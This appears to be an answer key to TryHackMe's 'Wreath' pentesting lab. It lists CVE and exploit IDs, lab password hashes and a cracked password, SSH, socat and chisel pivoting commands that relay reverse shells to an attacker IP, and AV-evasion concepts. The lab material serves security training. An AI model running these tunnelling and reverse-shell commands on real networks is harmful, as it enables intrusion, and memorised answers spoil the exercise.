# Wreath -Network [EASY]

Wreath
https://tryhackme.com/room/wreath

How many of the first 15000 ports are open on the target?
><details><summary>Click for answer</summary>`4</details>

What OS does Nmap think is running?
><details><summary>Click for answer</summary>`CentOS</details>

Open the IP in your browser -- what site does the server try to redirect you to?
><details><summary>Click for answer</summary>`https://thomaswreath.thm</details>

Read through the text on the page. What is Thomas' mobile phone number?
><details><summary>Click for answer</summary>`+447821548812</details>

Look back at your service scan results: what server version does Nmap detect as running here?
><details><summary>Click for answer</summary>`MiniServ 1.890 (Webmin httpd)</details>

What is the CVE number for this exploit?
><details><summary>Click for answer</summary>`CVE-2019-15107</details>

Which user was the server running as?
><details><summary>Click for answer</summary>`root</details>

What is the root user's password hash?
><details><summary>Click for answer</summary>`$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1</details>

What is the full path to this file?
><details><summary>Click for answer</summary>`/root/.ssh/id_rsa`</details>

Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?
><details><summary>Click for answer</summary>`Tunnelling`</details>

Research: Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?
><details><summary>Click for answer</summary>`portfwd`</details>

What is the absolute path to the file containing DNS entries on Linux?
><details><summary>Click for answer</summary>`/etc/resolv.conf`</details>

What is the absolute path to the hosts file on Windows?
><details><summary>Click for answer</summary>`C:\Windows\System32\drivers\etc\hosts`</details>

How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?
><details><summary>Click for answer</summary>`for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done`</details>

What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?
><details><summary>Click for answer</summary>`socks4 127.0.0.1 4242`</details>

What command would you use to telnet through a proxy to 172.16.0.100:23?
><details><summary>Click for answer</summary>`proxychains telnet 172.16.0.100 23`</details>

You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?
><details><summary>Click for answer</summary>`FP`</details>

If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?
><details><summary>Click for answer</summary>`L`</details>

Which switch combination can be used to background an SSH port forward or tunnel?
><details><summary>Click for answer</summary>`-fN`</details>

It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?
><details><summary>Click for answer</summary>`Nay`</details>

What command would you use to create a pair of throwaway SSH keys for a reverse connection?
><details><summary>Click for answer</summary>`ssh-keygen`</details>

If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")
><details><summary>Click for answer</summary>`ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN`</details>

What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?
><details><summary>Click for answer</summary>`ssh -D 8000 user@target.thm -fN`</details>

If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
><details><summary>Click for answer</summary>`ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN`</details>

What tool can be used to convert OpenSSH keys into PuTTY style keys?
><details><summary>Click for answer</summary>`puttygen`</details>

Which socat option allows you to reuse the same listening port for more than one connection?
><details><summary>Click for answer</summary>`reuseaddr`</details>

If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?
><details><summary>Click for answer</summary>`./socat tcp-l:8000 tcp:172.16.0.200:443`</details>

What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
><details><summary>Click for answer</summary>`./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &`</details>

What command would you use to start a chisel server for a reverse connection on your attacking machine?
><details><summary>Click for answer</summary>`./chisel server -p 4242 --reverse`</details>

What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
><details><summary>Click for answer</summary>`./chisel client 172.16.0.200:4242 R:socks &`</details>

How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
><details><summary>Click for answer</summary>`./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &`</details>

If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
><details><summary>Click for answer</summary>`./chisel client 172.16.0.5:4444 8000:172.16.0.10:80`</details>

How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16
><details><summary>Click for answer</summary>`sshuttle -r pwned@172.16.20.7 172.16.0.0/16`</details>

What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?
><details><summary>Click for answer</summary>`--ssh-cmd "ssh  -i priv_key"`</details>

What switch (and argument) could you use to fix this error?
><details><summary>Click for answer</summary>`-x 172.16.0.100`</details>

Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?
><details><summary>Click for answer</summary>`2`</details>

In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)
><details><summary>Click for answer</summary>`100,150`</details>

Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?
><details><summary>Click for answer</summary>`150`</details>

Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?
><details><summary>Click for answer</summary>`80,3389,5985`</details>

Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
><details><summary>Click for answer</summary>`HTTP`</details>

What is the name of the program running the service?
><details><summary>Click for answer</summary>`Gitstack`</details>

Do these default credentials work (Aye/Nay)?
><details><summary>Click for answer</summary>`Nay`</details>

There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?
><details><summary>Click for answer</summary>`43777`</details>

Look at the information at the top of the script. On what date was this exploit written?
><details><summary>Click for answer</summary>`18.01.2018`</details>

Bearing this in mind, is the script written in Python2 or Python3?
><details><summary>Click for answer</summary>`Python2`</details>

Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?
><details><summary>Click for answer</summary>`csrftoken`</details>

What is the hostname for this target?
><details><summary>Click for answer</summary>`git-serv`</details>

What operating system is this target?
><details><summary>Click for answer</summary>`Windows`</details>

What user is the server running as?
><details><summary>Click for answer</summary>`NT AUTHORITY\SYSTEM`</details>

How many make it to the waiting listener?
><details><summary>Click for answer</summary>`0`</details>

What is the Administrator password hash?
><details><summary>Click for answer</summary>`37db630168e5f82aafa8461e05c6bbd1`</details>

What is the NTLM password hash for the user "Thomas"?
><details><summary>Click for answer</summary>`02d90eda8f6b6b06c32d5f207831101f`</details>

What is Thomas' password?
><details><summary>Click for answer</summary>`i<3ruby`</details>

Can we get an agent back from the git server directly (Aye/Nay)?
><details><summary>Click for answer</summary>`Nay`</details>

Using the help command for guidance: in Empire CLI, how would we run the whoami command inside an agent?
><details><summary>Click for answer</summary>`shell whoami`</details>

Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?
><details><summary>Click for answer</summary>`80,3389`</details>

Using the Wappalyzer browser extension (Firefox | Chrome) or an alternative method, identify the server-side Programming language (including the version number) used on the website.
><details><summary>Click for answer</summary>`PHP 7.4.11`</details>

Use your WinRM access to look around the Git Server. What is the absolute path to the Website.git directory?
><details><summary>Click for answer</summary>`C:\Gitstack\Repositories\Website.git`</details>

What does Thomas have to phone Mrs Walker about?
><details><summary>Click for answer</summary>`Neighbourhood Watch Meetings`</details>

Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?
><details><summary>Click for answer</summary>`Basic Auth`</details>

Which extensions are accepted (comma separated, no spaces or quotes)?
><details><summary>Click for answer</summary>`jpg,jpeg,png,gif`</details>

Which category of evasion covers uploading a file to the storage on the target before executing it?
><details><summary>Click for answer</summary>`On-Disk Evasion`</details>

What does AMSI stand for?
><details><summary>Click for answer</summary>`Anti-Malware Scan Interface`</details>

Which category of evasion does AMSI affect?
><details><summary>Click for answer</summary>`In-Memory Evasion`</details>

What other name can be used for Dynamic/Heuristic detection methods?
><details><summary>Click for answer</summary>`Behavioural`</details>

If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?
><details><summary>Click for answer</summary>`Static`</details>

When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?
><details><summary>Click for answer</summary>`Pre-defined rules`</details>

What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?
><details><summary>Click for answer</summary>`Password`</details>

What is the Host Name of the target?
><details><summary>Click for answer</summary>`WREATH-PC`</details>

What is our current username (include the domain in this)?
><details><summary>Click for answer</summary>`wreath-pc\thomas`</details>

What output do you get when running the command: certutil.exe?
><details><summary>Click for answer</summary>`CertUtil: -dump command completed successfully.`</details>

[Research] One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?
><details><summary>Click for answer</summary>`SeImpersonatePrivilege`</details>

What is the Name (second column from the left) of this service?
><details><summary>Click for answer</summary>`SystemExplorerHelpService`</details>

Is the service running as the local system account (Aye/Nay)?
><details><summary>Click for answer</summary>`Aye`</details>

Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?
><details><summary>Click for answer</summary>`Nay`</details>

For what reason is HTTPS preferred over HTTP during exfiltration?
><details><summary>Click for answer</summary>`Encryption`</details>

What is the Administrator NT hash for this target?
><details><summary>Click for answer</summary>`a05c3c807ceeb48c47252568da284cd2`</details>

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
